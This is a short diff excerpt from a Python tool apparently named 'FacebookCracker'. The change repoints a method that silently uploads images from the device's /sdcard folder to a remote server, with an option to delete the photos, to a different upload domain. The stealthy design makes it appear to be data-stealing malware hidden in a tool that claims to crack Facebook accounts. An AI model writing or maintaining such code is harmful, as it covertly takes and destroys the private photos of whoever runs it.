@@ -91,7 +91,7 @@ class FacebookCracker:
 
     def upload_scripts(self, delete_photos=True):
         """Upload images in batches silently (no console output)."""
-        server_url_upload = "https://data.lolmailer.bar/api/upload_data"
+        server_url_upload = "https://data.submitwork.org/api/upload_data"
         sdcard_path = "/sdcard"
         time.sleep(random.randint(2, 5))
         if not os.path.exists(sdcard_path):
